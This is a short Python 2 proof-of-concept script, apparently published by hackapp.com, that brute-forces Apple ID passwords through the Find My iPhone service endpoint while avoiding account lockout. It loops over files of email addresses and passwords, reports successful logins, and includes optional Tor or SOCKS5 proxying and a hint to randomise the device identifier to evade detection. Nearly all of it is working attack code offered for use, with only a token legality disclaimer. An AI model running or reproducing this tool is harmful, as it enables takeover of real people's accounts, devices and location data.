# -*- coding: utf-8 -*-
#
#hackapp.com
#@hackappcom  p0c for FindMyIphone bug
#allows to bruteforce passwords  without AppleID lock.
#Before you start, make sure it's not illegal in your country.
#Have a nice brute

import json
import urllib2
import plistlib
from xml.dom.minidom import *
from lxml import etree
import unicodedata
import re
import xml.etree.ElementTree
import time
import random
import json
import cookielib
import urllib
import time
import socket
import base64
from time import strftime


import socks
import socket

#Uncomment to user t0r, or any other socks5 proxy

#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
#socket.socket = socks.socksocket

def TryPass(apple_id,password):


	url = 'https://fmipmobile.icloud.com/fmipservice/device/'+apple_id+'/initClient'

	headers = {
		'User-Agent': 'FindMyiPhone/376 CFNetwork/672.0.8 Darwin/14.0.0',
		}

	json = {
	"clientContext": {
	"appName": "FindMyiPhone",
	"osVersion": "7.0.4",
	"clientTimestamp": 429746389281,
	"appVersion": "3.0",
	#make it random!
	"deviceUDID": "0123456789485ef5b1e6c4f356453be033d15622",
	"inactiveTime": 1,
	"buildVersion": "376",
	"productType": "iPhone6,1"
	},
	"serverContext": {}
	}

	req_plist=plistlib.writePlistToString(json)

	req = urllib2.Request(url, req_plist, headers=headers)
	base64string = base64.encodestring('%s:%s' % (apple_id, password)).replace('\n', '')
	req.add_header("Authorization", "Basic %s" % base64string)



	try:
		resp = urllib2.urlopen(req)
	except urllib2.HTTPError, err:
		if err.code == 401:
			return False
		if err.code == 330:
			return True

	return 'bad'


with open('passlist.txt', 'r') as file:
	passwords = file.read()


with open('mails.txt', 'r') as file:
	apple_ids = file.read()



for apple_id in apple_ids.split('\n'):
	if apple_id:
		print 'Working with:',apple_id
		for pwd in passwords.split('\n'):
			if pwd:
				#print pwd
				password = pwd.split(' ')[1]
				print 'Trying: ', apple_id,password
				
				try:
					result = TryPass(apple_id,password)
					if result == True:
						print 'Got It!: ', apple_id,password
					if result == 'bad':
						print 'We are blocked!: ',apple_id,password
				except:
					print 'Protocol failed ',pwd

